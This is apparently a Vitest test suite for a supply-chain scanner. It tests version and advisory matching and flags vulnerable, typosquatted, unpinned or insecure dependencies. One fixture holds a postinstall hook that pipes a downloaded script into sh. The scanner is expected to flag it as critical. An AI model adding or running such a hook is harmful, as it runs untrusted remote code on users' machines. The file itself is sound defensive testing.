import { describe, expect, it } from 'vitest';
import { compareVersions, lowestSatisfyingVersion, rangeIsAffected, editDistance } from '../src/analysis/advisories';
import { dependenciesRule } from '../src/analysis/rules/dependencies';
import { expectRule, run } from './helpers';

describe('version handling', () => {
  it('orders versions numerically, not lexically', () => {
    expect(compareVersions('1.10.0', '1.9.0')).toBe(1);
    expect(compareVersions('2.0.0', '10.0.0')).toBe(-1);
    expect(compareVersions('1.2.3', '1.2.3')).toBe(0);
  });

  it('sorts a pre-release below its release', () => {
    expect(compareVersions('1.2.3-beta.1', '1.2.3')).toBe(-1);
    expect(compareVersions('1.2.3', '1.2.3-rc.1')).toBe(1);
  });

  it('extracts the lowest version a range permits', () => {
    expect(lowestSatisfyingVersion('^4.17.20')).toBe('4.17.20');
    expect(lowestSatisfyingVersion('>=1.2.0')).toBe('1.2.0');
    expect(lowestSatisfyingVersion('~2.1')).toBe('2.1');
    expect(lowestSatisfyingVersion('*')).toBeNull();
  });

  it('treats a range whose floor is below the fix as affected', () => {
    const advisory = {
      ecosystem: 'npm' as const,
      name: 'lodash',
      fixedIn: '4.17.21',
      cve: 'CVE-2021-23337',
      severity: 'high' as const,
      summary: 'x',
    };
    expect(rangeIsAffected('^4.17.20', advisory)).toBe(true);
    expect(rangeIsAffected('^4.17.21', advisory)).toBe(false);
    expect(rangeIsAffected('4.17.21', advisory)).toBe(false);
  });

  it('respects an advisory lower bound', () => {
    const advisory = {
      ecosystem: 'pypi' as const,
      name: 'django',
      fixedIn: '4.2.7',
      introducedIn: '4.2',
      cve: 'CVE-2023-46695',
      severity: 'medium' as const,
      summary: 'x',
    };
    expect(rangeIsAffected('4.2.1', advisory)).toBe(true);
    expect(rangeIsAffected('3.2.0', advisory)).toBe(false);
  });

  it('caps edit distance for early exit', () => {
    expect(editDistance('lodash', 'lodahs', 1)).toBeGreaterThan(1);
    expect(editDistance('lodash', 'lodashh', 1)).toBe(1);
    expect(editDistance('react', 'reacts', 1)).toBe(1);
  });
});

describe('dependencies', () => {
  it('flags a version range that permits a known advisory', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      `
{
  "dependencies": {
    "lodash": "^4.17.15",
    "express": "^4.21.2"
  }
}
`,
    );
    const finding = expectRule(findings, 'dependencies/known-vulnerable-version');
    expect(finding.title).toContain('lodash');
    expect(finding.title).toContain('CVE-2021-23337');
    expect(finding.severity).toBe('high');
  });

  it('does not flag a patched version', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "dependencies": {\n    "lodash": "^4.17.21"\n  }\n}',
    );
    expect(findings.filter((f) => f.ruleId === 'dependencies/known-vulnerable-version')).toEqual([]);
  });

  it('downgrades severity for a development dependency', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "devDependencies": {\n    "lodash": "^4.17.15"\n  }\n}',
    );
    const finding = expectRule(findings, 'dependencies/known-vulnerable-version');
    expect(finding.severity).toBe('medium');
  });

  it('flags an unbounded range', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "dependencies": {\n    "left-pad": "*"\n  }\n}',
    );
    expectRule(findings, 'dependencies/unbounded-version-range');
  });

  it('flags a plain-HTTP dependency source', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "dependencies": {\n    "internal-lib": "http://npm.internal/internal-lib.tgz"\n  }\n}',
    );
    const finding = expectRule(findings, 'dependencies/insecure-transport');
    expect(finding.severity).toBe('high');
  });

  it('flags a git dependency pinned only to a branch', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "dependencies": {\n    "tool": "git+https://github.com/acme/tool.git#main"\n  }\n}',
    );
    expectRule(findings, 'dependencies/unpinned-git-source');
  });

  it('accepts a git dependency pinned to a commit', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "dependencies": {\n    "tool": "git+https://github.com/acme/tool.git#3f1a9c2b4d5e6f708192a3b4c5d6e7f8091a2b3c"\n  }\n}',
    );
    expect(findings.filter((f) => f.ruleId === 'dependencies/unpinned-git-source')).toEqual([]);
  });

  it('flags an install hook that pipes a download into a shell', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "scripts": {\n    "postinstall": "curl -s https://example.com/i.sh | sh"\n  }\n}',
    );
    const finding = expectRule(findings, 'dependencies/install-hook-added');
    expect(finding.severity).toBe('critical');
  });

  it('reports an ordinary install hook only as informational', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "scripts": {\n    "postinstall": "node scripts/build.js"\n  }\n}',
    );
    const finding = expectRule(findings, 'dependencies/install-hook-added');
    expect(finding.severity).toBe('low');
  });

  it('flags a likely typosquat', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "dependencies": {\n    "lodashs": "^1.0.0"\n  }\n}',
    );
    const finding = expectRule(findings, 'dependencies/possible-typosquat');
    expect(finding.title).toContain('lodash');
  });

  it('does not flag the genuine package', () => {
    const findings = run(
      dependenciesRule,
      'package.json',
      '{\n  "dependencies": {\n    "lodash": "^4.17.21"\n  }\n}',
    );
    expect(findings.filter((f) => f.ruleId === 'dependencies/possible-typosquat')).toEqual([]);
  });

  it('reads requirements.txt', () => {
    const findings = run(
      dependenciesRule,
      'requirements.txt',
      ['# app dependencies', 'pyyaml==5.3.1', 'requests>=2.31.0'].join('\n'),
    );
    const finding = expectRule(findings, 'dependencies/known-vulnerable-version');
    expect(finding.title).toContain('pyyaml');
    expect(finding.severity).toBe('critical');
  });

  it('reads go.mod', () => {
    const findings = run(
      dependenciesRule,
      'go.mod',
      ['module example.com/app', '', 'require (', '\tgolang.org/x/net v0.17.0', ')'].join('\n'),
    );
    expectRule(findings, 'dependencies/known-vulnerable-version');
  });

  it('reads a Maven pom', () => {
    const findings = run(
      dependenciesRule,
      'pom.xml',
      `
<dependencies>
  <dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
  </dependency>
</dependencies>
`,
    );
    const finding = expectRule(findings, 'dependencies/known-vulnerable-version');
    expect(finding.title).toContain('CVE-2021-44228');
  });

  it('ignores files that are not manifests', () => {
    expect(run(dependenciesRule, 'src/app.ts', 'const lodash = require("lodash");')).toEqual([]);
  });
});
